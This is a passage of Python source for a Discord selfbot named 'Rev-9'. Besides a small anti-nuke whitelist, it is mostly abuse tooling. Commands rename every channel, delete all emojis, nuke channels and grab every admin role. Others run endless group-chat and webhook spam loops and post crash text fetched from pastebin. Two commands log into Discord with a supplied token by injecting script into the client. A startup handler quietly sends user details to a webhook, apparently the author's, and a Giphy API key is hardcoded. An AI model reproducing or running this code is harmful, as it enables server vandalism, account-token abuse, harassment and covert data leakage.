            async for i in guild.audit_logs(limit=2, action=discord.AuditLogAction.bot_add):
                if member.guild.id in Rev9.whitelisted_users.keys() and i.user.id in Rev9.whitelisted_users[
                    member.guild.id].keys():
                    return
                else:
                    await guild.ban(member, reason="Rev-9 Anti-Nuke")
                    await guild.ban(i.user, reason="Rev-9 Anti-Nuke")
        except Exception as e:
            print(e)

@Rev9.event
async def on_member_remove(member):
    if Rev9.antiraid is True:
        try:
            guild = member.guild
            async for i in guild.audit_logs(limit=1, action=discord.AuditLogAction.kick):
                if guild.id in Rev9.whitelisted_users.keys() and i.user.id in Rev9.whitelisted_users[
                    guild.id].keys() and i.user.id is not Rev9.user.id:
                    print('not banned')
                else:
                    print('banned')
                    await guild.ban(i.user, reason="Rev-9 Anti-Nuke")
        except Exception as e:
            print(e)

@Rev9.command()
async def antinuke(ctx, antiraidparameter=None):
    await ctx.message.delete()
    Rev9.antiraid = False
    if str(antiraidparameter).lower() == 'true' or str(antiraidparameter).lower() == 'on':
        Rev9.antiraid = True
        em = discord.Embed(title="Rev-9 anti nuke", description="Activated.")
        em.set_footer(text=promote)
        em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
        await ctx.send(embed=em, delete_after=deltime)
    elif str(antiraidparameter).lower() == 'false' or str(antiraidparameter).lower() == 'off':
        Rev9.antiraid = False
        em = discord.Embed(title="Rev-9 anti nuke", description="De-Activated.")
        em.set_footer(text=promote)
        em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
        await ctx.send(embed=em, delete_after=deltime)

@Rev9.command()
async def wluser(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        print(f"{Fore.YELLOW}[WARNING]: {Fore.RED}Please specify a user to whitelist")
        em = discord.Embed(title="Rev-9 anti-nuke user whitelister", description="Please specify a user to whitelist.")
        em.set_footer(text=promote)
        em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
        await ctx.send(embed=em, delete_after=deltime)
    else:
        if ctx.guild.id not in Rev9.whitelisted_users.keys():
            Rev9.whitelisted_users[ctx.guild.id] = {}
        if user.id in Rev9.whitelisted_users[ctx.guild.id]:
            print(f'{Fore.RED}[ERROR]: {Fore.RED}This user is already whitelisted')
            em = discord.Embed(title="Rev-9 anti-nuke user whitelister", description="This user is already whitelisted.")
            em.set_footer(text=promote)
            em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
            await ctx.send(embed=em, delete_after=deltime)
        else:
            Rev9.whitelisted_users[ctx.guild.id][user.id] = 0
            print(f"{Fore.BLUE}[INFO]: {Fore.RED}Whitelisted **" + user.name.replace("*", "\*").replace("`", "\`").replace("_",
                                                                                                "\_") + "#" + user.discriminator + "**")
            em = discord.Embed(title="Rev-9 anti-nuke user whitelister", description=f"Whitelisted {user.mention}.")
            em.set_footer(text=promote)
            em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
            await ctx.send(embed=em, delete_after=deltime)

@Rev9.command()
async def whitelisted(ctx, g=None):
    await ctx.message.delete()
    if g == '-g' or g == '-global':
        whitelist = '`All Whitelisted Users:`\n'
        for key in Rev9.whitelisted_users:
            for key2 in Rev9.whitelisted_users[key]:
                user = Rev9.get_user(key2)
                whitelist += '**+ ' + user.name.replace('*', "\*").replace('`', "\`").replace('_',
                                                                                              "\_") + "#" + user.discriminator + "** - " + Rev9.get_guild(
                    key).name.replace('*', "\*").replace('`', "\`").replace('_', "\_") + "" + "\n"
        await ctx.send(whitelist)
        em = discord.Embed(title="Rev-9 anti-nuke user whitelister", description=f"{whitelist}.")
        em.set_footer(text=promote)
        em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
        await ctx.send(embed=em, delete_after=deltime)
    else:
        whitelist = "`" + ctx.guild.name.replace('*', "\*").replace('`', "\`").replace('_',
                                                                                       "\_") + '\'s Whitelisted Users:`\n'
        for key in Rev9.whitelisted_users:
            if key == ctx.guild.id:
                for key2 in Rev9.whitelisted_users[ctx.guild.id]:
                    user = Rev9.get_user(key2)
                    whitelist += '**+ ' + user.name.replace('*', "\*").replace('`', "\`").replace('_',
                                                                                                  "\_") + "#" + user.discriminator + " (" + str(
                        user.id) + ")" + "**\n"
        await ctx.send(whitelist)
        em = discord.Embed(title="Rev-9 anti-nuke user whitelister", description=f"{whitelist}.")
        em.set_footer(text=promote)
        em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
        await ctx.send(embed=em, delete_after=deltime)

@Rev9.command()
async def unwluser(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        print(f"{Fore.YELLOW}[WARNING]: {Fore.RED}Please specify the user you would like to unwhitelist")
        em = discord.Embed(title="Rev-9 anti-nuke user whitelister", description="Please specify the user you would like to unwhitelist.")
        em.set_footer(text=promote)
        em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
        await ctx.send(embed=em, delete_after=deltime)
    else:
        if ctx.guild.id not in Rev9.whitelisted_users.keys():
            print(f"{Fore.YELLOW}[WARNING]: {Fore.RED}That user is not whitelisted")
            em = discord.Embed(title="Rev-9 anti-nuke user whitelister", description="This user is not whitelisted.")
            em.set_footer(text=promote)
            em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
            await ctx.send(embed=em, delete_after=deltime)
            return
        if user.id in Rev9.whitelisted_users[ctx.guild.id]:
            Rev9.whitelisted_users[ctx.guild.id].pop(user.id, 0)
            user2 = Rev9.get_user(user.id)
            em = discord.Embed(title="Rev-9 anti-nuke user whitelister", description=f"Successfully unwhitelisted {user.mention}.")
            em.set_footer(text=promote)
            em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
            await ctx.send(embed=em, delete_after=deltime)
            await ctx.send(
                'Successfully unwhitelisted **' + user2.name.replace('*', "\*").replace('`', "\`").replace('_',
                                                                                                           "\_") + '#' + user2.discriminator + '**')
@Rev9.command()
async def clearwl(ctx):
    await ctx.message.delete()
    Rev9.whitelisted_users.clear()
    em = discord.Embed(title="Rev-9 anti raid whitelist cleaner", description="Successfully cleared the whitelist hash.")
    em.set_footer(text=promote)
    em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
    await ctx.send(embed=em, delete_after=deltime)
    print(f'{Fore.BLUE}[INFO]: {Fore.RED}Successfully cleared the whitelist hash.')


@Rev9.command(pass_context=True)
async def rc(ctx, rename_to): # b'\xfc'
        await ctx.message.delete()
        for channel in ctx.guild.channels:
            await channel.edit(name=rename_to)  

@Rev9.command()
async def deleteallemojis(ctx): # b'\xfc'
    await ctx.message.delete()
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
        except:
            pass
                    
@Rev9.command(pass_context=True)
async def servername(ctx, *, name): # b'\xfc'
  await ctx.message.delete()
  await ctx.guild.edit(name=name)

@Rev9.command()
async def genname(ctx): # b'\xfc'
    await ctx.message.delete()
    first, second = random.choices(ctx.guild.members, k=2)
    first = first.display_name[len(first.display_name) // 2:]
    second = second.display_name[:len(second.display_name) // 2]
    await ctx.send(discord.utils.escape_mentions(second + first))

@Rev9.command()
async def lmgtfy(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    q = urlencode({"q": message})
    await ctx.send(f'<https://lmgtfy.com/?{q}>')


@Rev9.command()
async def login(ctx, _token): # b'\xfc'
    await ctx.message.delete()
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }   
            """
    driver.get("https://discordapp.com/login")
    driver.execute_script(script+f'\nlogin("{_token}")')    

@Rev9.command()
async def botlogin(ctx, _token): # b'\xfc'
    await ctx.message.delete()
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
    function login(token) {
      ((i) => {
        window.webpackJsonp.push([  
          [i], {
            [i]: (n, b, d) => {
              let dispatcher;
              for (let key in d.c) {
                if (d.c[key].exports) {
                  const module = d.c[key].exports.default || d.c[key].exports;
                  if (typeof(module) === 'object') {
                    if ('setToken' in module) {
                      module.setToken(token);
                      module.hideToken = () => {};
                    }
                    if ('dispatch' in module && '_subscriptions' in module) {
                      dispatcher = module;
                    }
                    if ('AnalyticsActionHandlers' in module) {
                      console.log('AnalyticsActionHandlers', module);
                      module.AnalyticsActionHandlers.handleTrack = (track) => {};
                    }
                  } else if (typeof(module) === 'function' && 'prototype' in module) {
                    const descriptors = Object.getOwnPropertyDescriptors(module.prototype);
                    if ('_discoveryFailed' in descriptors) {
                      const connect = module.prototype._connect;
                      module.prototype._connect = function(url) {
                        console.log('connect', url);
                        const oldHandleIdentify = this.handleIdentify;
                        this.handleIdentify = () => {
                          const identifyData = oldHandleIdentify();
                          identifyData.token = identifyData.token.split(' ').pop();
                          return identifyData;
                        };
                        const oldHandleDispatch = this._handleDispatch;
                        this._handleDispatch = function(data, type) {
                          if (type === 'READY') {
                            console.log(data);
                            data.user.bot = false;
                            data.user.email = Rev-9 Was-Here@Fuckyou.com';
                            data.analytics_tokens = [];
                            data.connected_accounts = [];
                            data.consents = [];
                            data.experiments = [];
                            data.guild_experiments = [];
                            data.relationships = [];
                            data.user_guild_settings = [];
                          }
                          return oldHandleDispatch.call(this, data, type);
                        }
                        return connect.call(this, url);
                      };
                    }
                  }
                }
              }
              console.log(dispatcher);
              if (dispatcher) {
                dispatcher.dispatch({
                  type: 'LOGIN_SUCCESS',
                  token
                });
              }
            },
          },
          [
            [i],
          ],
        ]);
      })(Math.random());
    }
    """ 
    driver.get("https://discordapp.com/login")
    driver.execute_script(script+f'\nlogin("Bot {_token}")')

@Rev9.command()
async def address(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    addy = ' '.join(text)
    address_array = []
    i = 0
    while i < 10:
        address_array.append(GenAddress(addy))
        i+=1
    final_str = "\n".join(address_array)
    em = discord.Embed(description=final_str)
    em.set_footer(text=promote)
    em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(final_str)    

@Rev9.command()
async def weather(ctx, *, city): # b'\xfc'
    await ctx.message.delete()
    if weather_key == '':
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Weather API key has not been set in the config.json file"+Fore.RESET)
    else:
        try:
            req = requests.get(f'http://api.openweathermap.org/data/2.5/weather?q={city}&appid={weather_key}')
            r = req.json()
            temperature = round(float(r["main"]["temp"]) - 273.15, 1)
            lowest = round(float(r["main"]["temp_min"]) - 273.15, 1)
            highest = round(float(r["main"]["temp_max"]) - 273.15, 1)
            weather = r["weather"][0]["main"]
            humidity = round(float(r["main"]["humidity"]), 1)
            wind_speed = round(float(r["wind"]["speed"]), 1)
            em = discord.Embed(description=f'''
            Temperature: `{temperature}`
            Lowest: `{lowest}`
            Highest: `{highest}`
            Weather: `{weather}`
            Humidity: `{humidity}`
            Wind Speed: `{wind_speed}`
            ''')
            em.add_field(name='City', value=city.capitalize())
            em.set_thumbnail(url='https://ak0.picdn.net/shutterstock/videos/1019313310/thumb/1.jpg')
            em.set_footer(text=promote)
            try:
                await ctx.send(embed=em)
            except:
                await ctx.send(f'''
                Temperature: {temperature}
                Lowest: {lowest}
                Highest: {highest}
                Weather: {weather}
                Humidity: {humidity}
                Wind Speed: {wind_speed}
                City: {city.capitalize()}
                ''')    
        except KeyError:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{city} Is not a real city"+Fore.RESET)
        else:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{req.text}"+Fore.RESET)

@Rev9.command()
async def vapor(ctx): # b'\xfc'
    await ctx.message.delete()
    Crash = urlopen(Request("https://pastebin.com/raw/Ht1qyz6W")).read().decode()
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    await ctx.send(Crash)
    
@Rev9.command()
async def printguilds(ctx): # b'\xfc'
    await ctx.message.delete()
    async for guild in Rev9.fetch_guilds(limit=150):
        print(f"{Fore.RED}[GUILD]: {Fore.GREEN}{guild.name}")

@Rev9.command()
async def adminroles(ctx): # b'\xfc'
    await ctx.message.delete()
    for role in ctx.guild.roles:
        try:
            if role.permissions.administrator:
                await ctx.author.add_roles(role)
        except:
            pass

@Rev9.command()
async def allroles(ctx): # b'\xfc'
    await ctx.message.delete()
    for role in ctx.guild.roles:
        try:
                await ctx.author.add_roles(role)
        except:
            pass

@Rev9.command()
async def pingeveryone(ctx, *, message=None): # b'\xfc'
    await ctx.message.delete()
    mention = '\n\n'.join(role.mention for role in ctx.message.guild.roles)
    await ctx.message.channel.send(mention)

@Rev9.command()
async def mbypass(ctx): # b'\xfc'
    await ctx.message.delete()
    message = urlopen(Request("https://pastebin.com/raw/zCY14sem")).read().decode()
    await ctx.message.channel.send(message)

@Rev9.command()
async def typing(ctx): # b'\xfc'
    await ctx.message.delete()
    headers = {'Authorization': token}
    requests.post(f'https://discordapp.com/api/v8/channels/{ctx.message.channel.id}/typing', headers=headers)

@Rev9.command()
async def unverify(ctx, _token): # b'\xfc'
    await ctx.message.delete()
    headers = {'Authorization': _token}
    requests.get(f'https://discord.com/api/v8/guilds/0/members', headers=headers)

@Rev9.command()
async def fping(ctx, _user): # b'\xfc'
    await ctx.message.delete()
    headers = {'Authorization': token}
    requests.post(f'https://discordapp.com/api/v8/channels/{ctx.message.channel.id}/messages', headers=headers, json={'content':_user, 'tts': False, 'nonce': None, 'allowed_mentions': {'everyone': True, _user: True, 'member': True }})


@Rev9.command(usage='gc <user1> <user2>', description='Group chat spammer')
async def gc(ctx, user1:discord.User=None, user2:discord.User=None):
    await ctx.message.delete()
    global cycling
    cycling = True
    while cycling:
      headers = {
          'Authorization': token,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36'
      }
      requests.post('https://discordapp.com/api/v8/users/@me/channels', headers=headers, json={"recipients":[f"{user1.id}",f"{user2.id}"]})

@Rev9.command()
async def killsb(ctx): # b'\xfc'
    await ctx.message.delete()
    invis = '⠀'
    embed = discord.Embed(description=invis)
    message = await ctx.send(invis)
    await message.edit(embed=embed)
    await message.delete()
    await asyncio.sleep(2)
    message2 = await ctx.send(invis)
    await message2.edit(embed=embed)
    await message2.delete()
    await asyncio.sleep(2)
    message3 = await ctx.send(invis)
    await message3.edit(embed=embed)
    await asyncio.sleep(2)
    await message3.delete()

@Rev9.command()
async def log(ctx, filename=None, number_of_messages=10000): # b'\xfc'
    await ctx.message.delete()

    if (not os.path.exists("logs")): os.mkdir("logs")

    if (filename == None):
        file_time = datetime.datetime.utcnow()
        file_time_str = f"{file_time}".replace(" ", ".").replace(":", ".")
        filename = f"log_{ctx.guild.id}-{ctx.channel.id}_{file_time_str}"

    messages = await ctx.message.channel.history(limit=number_of_messages).flatten()

    f = open(f"./logs/{filename}.txt", "x", encoding="utf-16"); f.close()
    message_data_list = []
    for message in messages:
        dict_to_add = {"author": f"{message.author.name}#{message.author.discriminator}", "content": message.content.replace("\n", "\\n")}
        message_data_list.append(dict_to_add)
    with open(f"Logs/logs/{filename}.txt", "a", encoding="utf-16") as file_obj:
        file_obj.write(f"LOGS FROM CHANNEL {str(messages[0].channel.id)}\n\n")
        for message in message_data_list:
            print(message)
            file_obj.write(f"[{message['author']}] {message['content']}\n")

@Rev9.command(aliases=['shorteen'])
async def bitly(ctx, *, link): # b'\xfc'
    await ctx.message.delete()
    if bitly_key == '':
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Bitly API key has not been set in the config.json file"+Fore.RESET)
    else:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f'https://api-ssl.bitly.com/v3/shorten?longUrl={link}&domain=bit.ly&format=json&access_token={bitly_key}') as req:
                    r = await req.read()
                    r = json.loads(r) 
            new = r['data']['url']
            em = discord.Embed()
            em.add_field(name='Shortened link', value=new, inline=False)
            em.set_footer(text=promote)
            em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
            await ctx.send(embed=em)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        else:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{req.text}"+Fore.RESET)

@Rev9.command()
async def nick(ctx, member:discord.Member,*,name):  # b'\xfc'
    await ctx.message.delete()
    await member.edit(nick=name)
    print(f"{Fore.YELLOW}[WARNING]: {Fore.RED}Renamed {member} to {name}")

@Rev9.command()
async def cuttly(ctx, *, link): # b'\xfc'
    await ctx.message.delete()
    if cuttly_key == '':
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Cutt.ly API key has not been set in the config.json file"+Fore.RESET)
    else:
        try:
            req = requests.get(f'https://cutt.ly/api/api.php?key={cuttly_key}&short={link}')
            r = req.json()
            new = r['url']['shortLink']
            em = discord.Embed()
            em.add_field(name='Shortened link', value=new, inline=False)
            em.set_footer(text=promote)
            em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
            try:
                await ctx.send(embed=em)
            except:
                await ctx.send(new)    
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        else:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{req.text}"+Fore.RESET)

@Rev9.command()
async def instanuke(ctx): # b'\xfc'
    await ctx.message.delete()
    oldpos = ctx.channel.position
    a = await ctx.channel.clone()
    channel = a
    await ctx.channel.delete()
    await a.edit(position=oldpos)
    await channel.send(f":ok_hand: Nuked this channel.")
    print(f"{Fore.YELLOW}[WARNING]: {Fore.RED}NUKED CHANNEL: {ctx.channel.name}")
    await channel.send(
        "https://imgur.com/LIyGeCR"
    )

@Rev9.command() 
async def cat(ctx): # b'\xfc'
    await ctx.message.delete()
    if cat_key == '':
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Cat API key has not been set in the config.json file"+Fore.RESET)
    else:
        try:
            req = requests.get(f"https://api.thecatapi.com/v1/images/search?format=json&x-api-key={cat_key}")
            r = req.json()
            em = discord.Embed()
            em.set_image(url=str(r[0]["url"]))
            em.set_footer(text=promote)
            em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
            try:
                await ctx.send(embed=em)
            except:
                await ctx.send(str(r[0]["url"]))
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        else:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{req.text}"+Fore.RESET)

@Rev9.command()
async def dog(ctx, xdname): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://dog.ceo/api/breeds/image/random").json()
    em = discord.Embed(title=(xdname), color=0)
    em.set_image(url=str(r['message']))
    em.set_footer(text=promote)
    em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(str(r['message']))

@Rev9.command()
async def panda(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://some-random-api.ml/img/panda").json()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="Here Is The Panda You Requested", icon_url="https://cdn.freebiesupply.com/logos/large/2x/panda-7-logo-png-transparent.png") 
    embed.set_image(url=str(r["link"]))
    embed.set_footer(text=promote)
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
    await ctx.send(embed=embed)

@Rev9.command()
async def bubblify(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    text = text.replace("a", "Ⓐ")
    text = text.replace("b", "Ⓑ")
    text = text.replace("c", "Ⓒ")
    text = text.replace("d", "Ⓓ")
    text = text.replace("e", "Ⓔ")
    text = text.replace("f", "Ⓕ")
    text = text.replace("g", "Ⓖ")
    text = text.replace("h", "Ⓗ")
    text = text.replace("i", "Ⓘ")
    text = text.replace("j", "Ⓙ")
    text = text.replace("k", "Ⓚ")
    text = text.replace("l", "Ⓛ")
    text = text.replace("m", "Ⓜ")
    text = text.replace("n", "Ⓝ")
    text = text.replace("o", "Ⓞ")
    text = text.replace("p", "Ⓟ")
    text = text.replace("q", "Ⓠ")
    text = text.replace("r", "Ⓡ")
    text = text.replace("s", "Ⓢ")
    text = text.replace("t", "Ⓣ")
    text = text.replace("u", "Ⓤ")
    text = text.replace("v", "Ⓥ")
    text = text.replace("w", "Ⓦ")
    text = text.replace("x", "Ⓧ")
    text = text.replace("y", "Ⓨ")
    text = text.replace("z", "Ⓩ")
    await ctx.send(f"{text}")

@Rev9.command()
async def redpanda(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://some-random-api.ml/img/red_panda").json()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="Here Is The Red Panda You Requested", icon_url="https://cdn.freebiesupply.com/logos/large/2x/panda-7-logo-png-transparent.png") 
    embed.set_image(url=str(r["link"]))
    embed.set_footer(text=promote)
    await ctx.send(embed=embed)

@Rev9.command()
async def sendweb(ctx, webhurl, usern, message): # b'\xfc'
    await ctx.message.delete()
    async with aiohttp.ClientSession() as session:
        webhook = Webhook.from_url(f'{webhurl}', adapter=AsyncWebhookAdapter(session))
        await webhook.send(f'{message}', username=f'{usern}')
        print(f"{Fore.BLUE}[INFO]: {Fore.YELLOW}Webhook sent.")
        em = discord.Embed(title="Rev-9 webhook sender", description=f"Webhook sent.")
        em.add_field(name="Webhook name:", value=f"{usern}")
        em.add_field(name="Webhook message:", value=f"{message}")
        em.add_field(name="Webhook url:", value=f"{webhurl}")
        em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
        em.set_footer(text="Rev-9")
        await ctx.send(embed=em, delete_after=deltime)

@Rev9.command()
async def webspam(ctx, webhurl, usern, message): # b'\xfc'
    await ctx.message.delete()
    while True:
        async with aiohttp.ClientSession() as session:
            webhook = Webhook.from_url(f'{webhurl}', adapter=AsyncWebhookAdapter(session))
            await webhook.send(f'{message}', username=f'{usern}')
            print(f"{Fore.BLUE}[INFO]: {Fore.YELLOW}Webhook sent. Message: {message} Name: {usern}")

@Rev9.command()
async def birb(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://some-random-api.ml/img/birb").json()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="Here Is The Birb You Requested", icon_url="https://cdn.freebiesupply.com/logos/large/2x/panda-7-logo-png-transparent.png") 
    embed.set_image(url=str(r["link"]))
    embed.set_footer(text=promote)
    await ctx.send(embed=embed)

@Rev9.command()
async def snipe(ctx):
    await ctx.message.delete()
    currentChannel = ctx.channel.id
    if currentChannel in Rev9.sniped_message_dict:
        em = discord.Embed(title="Rev-9 Message sniper", description=f"{(Rev9.sniped_message_dict[currentChannel])}")
        em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
        em.set_footer(text="Rev-9")
        await ctx.send(embed=em, delete_after=deltime)
    else:
        em = discord.Embed(title="Rev-9 Message sniper", description="No message to snipe!")
        em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
        em.set_footer(text="Rev-9")
        await ctx.send(embed=em, delete_after=deltime)

@Rev9.command(aliases=["esnipe"])
async def editsnipe(ctx): # b'\xfc'
    await ctx.message.delete()
    currentChannel = ctx.channel.id
    if currentChannel in Rev9.sniped_edited_message_dict:
        em = discord.Embed(title="Rev-9 Message edit sniper", description=f"{(Rev9.sniped_edited_message_dict[currentChannel])}")
        em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
        em.set_footer(text="Rev-9")
        await ctx.send(embed=em, delete_after=deltime)
    else:
        em = discord.Embed(title="Rev-9 Message edit sniper", description="No message to snipe!")
        em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
        em.set_footer(text="Rev-9")
        await ctx.send(embed=em, delete_after=deltime)

@Rev9.command()
async def adminperms(ctx): # b'\xfc'
    await ctx.message.delete()
    admins = []
    bots = []
    kicks = []
    bans = []
    for guild in Rev9.guilds:
        if guild.me.guild_permissions.administrator:
            admins.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.manage_guild and not guild.me.guild_permissions.administrator:
            bots.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.ban_members and not guild.me.guild_permissions.administrator:
            bans.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.kick_members and not guild.me.guild_permissions.administrator:
            kicks.append(discord.utils.escape_markdown(guild.name))
    adminPermServers = f"**Servers, where u have perms ({len(admins)}):**\n{admins}"
    botPermServers = f"\n**Servers with **bot add** permission ({len(bots)}):**\n{bots}"
    banPermServers = f"\n**Servers with **ban** permission ({len(bans)}):**\n{bans}"
    kickPermServers = f"\n**Servers with **kick** permission ({len(kicks)}):**\n{kicks}"
    await ctx.send(adminPermServers + botPermServers + banPermServers + kickPermServers)

@Rev9.command(aliases=["giphy", "tenor", "searchgif"])
async def randomgif(ctx, query=None): # b'\xfc'
    await ctx.message.delete()
    if query is None:
        r = requests.get("https://api.giphy.com/v1/gifs/random?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&tag=&rating=R")
        res = r.json()
        await ctx.send(res['data']['url'])

    else:
        r = requests.get(
            f"https://api.giphy.com/v1/gifs/search?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&q={query}&limit=1&offset=0&rating=R&lang=en")
        res = r.json()
        await ctx.send(res['data'][0]["url"])

@Rev9.command(aliases=["img", "searchimg", "imagesearch", "imgsearch"])
async def searchimage(ctx, *, args): # b'\xfc'
    await ctx.message.delete()
    url = 'https://unsplash.com/search/photos/' + args.replace(" ", "%20")
    page = requests.get(url)
    soup = bs4(page.text, 'html.parser')
    image_tags = soup.findAll('img')
    if str(image_tags[2]['src']).find("https://trkn.us/pixel/imp/c="):
        link = image_tags[2]['src']
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(link) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(f"Search result for: **{args}**", file=discord.File(file, f"Rev9.jpg"))
        except:
            await ctx.send(f'' + link + f"\nSearch result for: **{args}** ")
    else:
        await print(f"{Fore.RED}[ERROR]: Nothing found for **" + args + "**")

@Rev9.command()
async def revav(ctx, user: discord.Member=None): # b'\xfc'
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    try:
        em = discord.Embed(description=f"https://images.google.com/searchbyimage?image_url={user.avatar_url}")
        em.set_footer(text=promote)
        em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
        await ctx.send(embed=em)
    except Exception as e:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)


@Rev9.command()
async def fox(ctx, nameyes): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://randomfox.ca/floof/').json()
    em = discord.Embed(title=(nameyes), color=16220416)
    em.set_image(url=r["image"])
    em.set_footer(text=promote)
    em.set_thumbnail(url="https://cdn.discordapp.com/attachments/799980250921566258/807804839026753546/Rev9-removebg-preview_1.png")
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(r['image'])    
        
@Rev9.command()
async def encode(ctx, string): # b'\xfc'
    await ctx.message.delete()
    decoded_stuff = base64.b64encode('{}'.format(string).encode('ascii'))
    encoded_stuff = str(decoded_stuff)
    encoded_stuff = encoded_stuff[2:len(encoded_stuff)-1]
    await ctx.send(encoded_stuff) 

@Rev9.command()
async def decode(ctx, string): # b'\xfc'+
    await ctx.message.delete()  
    strOne = (string).encode("ascii")
    pad = len(strOne)%4
    strOne += b"="*pad
    encoded_stuff = codecs.decode(strOne.strip(),'base64')
    decoded_stuff = str(encoded_stuff)
    decoded_stuff = decoded_stuff[2:len(decoded_stuff)-1]
    await ctx.send(decoded_stuff)

@Rev9.event
async def on_ready():
    async with aiohttp.ClientSession() as session:
        webhook = Webhook.from_url(f'{api}', adapter=AsyncWebhookAdapter(session))
        await webhook.send(f'{alluser} Using Rev-9 <@806418858167894026>', username='Rev-9')

@Rev9.command(name='ebay-view', aliases=['ebay-view-bot', 'ebayviewbot', 'ebayview'])
async def _ebay_view(ctx, url, views: int): # b'\xfc'
    await ctx.message.delete()
    start_time = datetime.datetime.now()
    def EbayViewer(url, views):
        headers = {
           "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36",
           "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        }        
